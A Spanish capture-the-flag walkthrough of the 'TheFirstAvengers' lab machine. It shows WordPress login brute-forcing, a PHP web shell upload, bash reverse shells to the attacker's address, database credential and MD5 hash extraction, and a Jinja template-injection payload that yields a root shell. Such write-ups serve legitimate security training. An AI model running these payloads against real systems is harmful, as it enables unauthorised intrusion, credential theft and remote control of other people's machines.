
# Writeup Template: Maquina `[ TheFirstAvengers ]`
- **Enumeración de aplicación web**: Exploración de contenido web visible y oculto para detectar puntos de entrada.
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.
- **Fuzzing de rutas web**: Ataque de fuerza bruta sobre rutas de la web para descubrir archivos o directorios.
- **Inclusión de archivos locales (LFI)**: Explotación de vulnerabilidades que permiten incluir archivos locales del sistema objetivo.
- **Obtención de reverse shell**: Establecimiento de una conexión inversa para ejecutar comandos remotamente.
- **Sesión Meterpreter**: Acceso interactivo al sistema comprometido a través de una shell avanzada de Metasploit.

- Tags: #TheFirstAvengers
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.14
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.14
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.14
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.14 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.14 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.14 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.14
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://thefirstavenger.thl/wp1/
http://thefirstavenger.thl/wp1/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.100.14], MetaGenerator[WordPress 6.6.2], Script[importmap,module], Title[The First Avenger], UncommonHeaders[link], WordPress[6.6.2]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 192.168.100.14 # No reporta rutas
```

### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.14/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 474]
/wp1                  (Status: 301) [Size: 314] [--> http://192.168.100.14/wp1/]
```

Ahora tenemos un codigo de estado **301MovedPermanently** lo que significa que el recurso fuer movio a otra ruta:
Por lo que realizaremos fuzzing a la siguiente ruta:
```bash
gobuster dir -u http://192.168.100.14/wp1/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

Reporte:
```bash
/wp-content           (Status: 301) [Size: 325] [--> http://192.168.100.14/wp1/wp-content/]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 326] [--> http://192.168.100.14/wp1/wp-includes/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.100.14/wp1/]
/readme.html          (Status: 200) [Size: 7409]
/wp-login.php         (Status: 200) [Size: 6694]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 323] [--> http://192.168.100.14/wp1/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://thefirstavenger.thl/wp1/wp-login.php?action=register]
```

Todo inidca que tenemos un servicion de **wordPress** correindo asi que agregamos a nuestro archivo: **( /etc/hosts )** la siguiente linea:
```bash
# HostDiscovery Alx

192.168.100.14 thefirstavenger.thl
```
### Enumeracion WordPress
Realizamos una enumeracion agresiva:
```bash
wpscan --url http://thefirstavenger.thl/wp1/ --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Reporte:
```bash
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos un usuario valido procederemos a realizar fuerza bruta sobre el panel de **login**
```bash
wpscan --url http://thefirstavenger.thl/wp1/wp-login.php/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Tenemos una credencial valida de acceso
```bash
# Comandos para explotación
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / spongebob                              
Trying admin / spongebob Time: 00:00:01 <                  

[!] Valid Combinations Found:
```

Logramos ganar acceso al panel del administrador
```bash
http://thefirstavenger.thl/wp1/wp-admin/
```

Ahora lo que tenemos que ver es como explotar el tema desactualizado
```bash
[+] WordPress theme in use: twentytwentyfour
 | Location: http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
```

Para aprovecharnos, Instalarremos el plugin: **( Administrador de archivos WP )** para poder cargar un archivo malicioso
Creamos un archivo malicioso desde nuestra maquina de atacante que contendra las siguientes instrucciones
```php
# shell.php

<?php
  system($_GET["cmd"]);
?>
```

Ahora desde esta ruta con el **Administrador de archivos WP** subiremos nuestro archivo malicioso: **shell.php**
```bash
http://thefirstavenger.thl/wp1/wp-content/uploads/
```

Ahora probamos atraves de nuestro archivo malicioso, si tenemos capacidad de ejecucion remota de comandos:
```bash
http://thefirstavenger.thl/wp1/wp-content/uploads/shell.php?cmd=whoami
```

Logramos **RCE** exitoso:
```bash
www-data
```
### Intrusion
Ahora que tenemos **RCE** nos pondemos en escucha para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://thefirstavenger.thl/wp1/wp-content/uploads/shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.24/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos enumeracion de usuarios
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
steve:x:1000:1000:Steve Rogers:/home/steve:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Enumerando el directorio de este usuario, tenemos lo siguiente: **wp-config.php**, Si revisamos su contenido:
```bash
cat wp-config.php
```

```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Tenemso credenciales de acceso, y para conectarnos
```bash
mysql -u wordpress -p # ( 9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r )
```

Una ves conectados, Enumeramos las bases de datos:
```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| top_secret         |
| wordpress          |
+--------------------+
```

Ahora cambiamos a **top_secret** para ver si contiene informacion valiosa:
```sql
mysql> use top_secret;
```

Enumeramos las tablas para esta base de datos:
```sql
mysql> show tables;
+----------------------+
| Tables_in_top_secret |
+----------------------+
| avengers             |
+----------------------+
```

Revisamos la estructura de la tabla:
```sql
mysql> desc avengers;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int          | NO   | PRI | NULL    | auto_increment |
| name     | varchar(100) | NO   |     | NULL    |                |
| username | varchar(100) | NO   | UNI | NULL    |                |
| password | varchar(255) | NO   |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
```

Enumeramos la informacion para esta tabla:
```sql
mysql> select username, password from avengers;
+------------+----------------------------------+
| username   | password                         |
+------------+----------------------------------+
| ironman    | cc20f43c8c24dbc0b2539489b113277a |
| thor       | 077b2e2a02ddb89d4d25dd3b37255939 |
| hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |
| blackwidow | 022e549d06ec8ddecb5d510b048f131d |
| hawkeye    | d74727c034739e29ad1242b643426bc3 |
| steve      | 723a44782520fcdfb57daa4eb2af4be5 |
+------------+----------------------------------+
```

De este tabla el unico potencial que nos interesa es **steve** ya que es un usuario valido para el sistema:
```bash
steve      | 723a44782520fcdfb57daa4eb2af4be5
```

Sabiendo que son 32 caractares de longitud sabemos que es un hash **MD5**
```bash
echo -n "723a44782520fcdfb57daa4eb2af4be5" | wc --chars
32
```

Usamos este recurso only [Hashes](https://hashes.com/en/decrypt/hash) para desencriptar el hash
```bash
723a44782520fcdfb57daa4eb2af4be5:thecaptain
```

Ahora migramos de usuario:
```bash
su steve # ( thecaptain )
```
###### Usuario `[ steve ]`:
Flag de usuario:
```bash
ls -la

-rw-rw-r-- 1 steve steve   41 Oct  8  2024 user.txt
```

Ahora mirando los servicios internos de la maquina vemos lo siguiente:
```bash
ss -tuln

Netid    State      Recv-Q     Send-Q      Local Address:Port          Peer Address:Port   Process
tcp      LISTEN      0          128          127.0.0.1:7092                0.0.0.0:*
```

Sabiendo esto realizaremos **portFordwarding** para traerenos ese servicio a nuestra maquina maquina de atacante con el siguiente comando:
```bash
ssh -L 7092:127.0.0.1:7092 steve@192.168.100.14 # ( thecaptain )

The authenticity of host '192.168.100.14 (192.168.100.14)' can't be established.
ED25519 key fingerprint is SHA256:SkGtsrKdRWfV/jl8NWqLHZLO1tKHbWvnfeauJbeYcMw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.14' (ED25519) to the list of known hosts.
steve@192.168.100.14's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.




                         ██████╗██╗██████╗ ███████╗██████╗                           
                        ██╔════╝██║██╔══██╗██╔════╝██╔══██╗                          
                        ██║     ██║██████╔╝█████╗  ██████╔╝                          
                        ██║     ██║██╔══██╗██╔══╝  ██╔══██╗                          
                        ╚██████╗██║██████╔╝███████╗██║  ██║                          
                         ╚═════╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝                          
                                                                                     
██╗   ██╗███████╗███╗   ██╗ ██████╗  █████╗ ██████╗  ██████╗ ██████╗ ███████╗███████╗
██║   ██║██╔════╝████╗  ██║██╔════╝ ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝██╔════╝
██║   ██║█████╗  ██╔██╗ ██║██║  ███╗███████║██║  ██║██║   ██║██████╔╝█████╗  ███████╗
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██╔══██║██║  ██║██║   ██║██╔══██╗██╔══╝  ╚════██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║  ██║██████╔╝╚██████╔╝██║  ██║███████╗███████║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
```

Ahora accedemos en la web, bajo direccion de **loopback** con el puerto que indicamos 
```bash
http://127.0.0.1:7092/
```

Tenemos una web que nos permite ejecutar ping, Ahora si no esta sanitizado podemos aprovecharnos para concatenar comandos
No logramos ejecutar el comando **ping**
Ahora revisando las tecnologias que corren detras de esta web tenemos que corre python por detras
```bash
whatweb http://127.0.0.1:7092/
http://127.0.0.1:7092/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[127.0.0.1], Python[3.12.3], Title[Network toolkit], Werkzeug[3.0.1]
```

Probando una inyeccion como esta no tuvimos exito
```bash
import os; os.system("whoami")
```

Investigando en internet tenemos lo siguiente:
```bash
**Werkzeug** es una **librería de Python** que proporciona herramientas para construir aplicaciones web. Es el **motor WSGI** (interfaz de servidor) que usa **Flask**, un popular framework web.
```

Ahora sabiendo que **flask**, Se puede realizar inyecciones aritmeticas, probraremos inyectar lo siguietne:
```bash
{{7*7}}
```

Si el servidor nos responde con un **49** ya tenemos asegurado, **RCE**
Aunque la web no devuelva lo siguiente:
```bash
 Error al ejecutar: /usr/bin/ping: {{7*7}}: Name or service not known
```

Desde el input tenemos reflejado un **49**, Asi que tenemos **RCE** garantizado, Nos aprovechamos de esto para, realizar la siguiente inyeccones con un payload de **hacktriks**
Si ejecutamos este payload tenemos garantizado el acceso como **root**
```python
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Ya que el servicio esta corriendo como root
```bash
uid=0(root) gid=0(root) groups=0(root)
```

Nos ponemos en escucha:
```bash
nc -nlvp 4444
```

```bash
# Comando para escalar al usuario: ( root )
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "exec bash -i &>/dev/tcp/192.168.100.24/4444 <&1"').read() }}
```

---

## Evidencia de Compromiso
Flag **root**
```bash
ls -la /root

-rw-r--r--  1 root root   41 Oct  8  2024 root.txt
```

```bash
# Captura de pantalla o output final
root@TheHackersLabs-Thefirstavenger:/# echo -e "\n[+] pwned: $(whoami)\n"

[+] pwned: root
```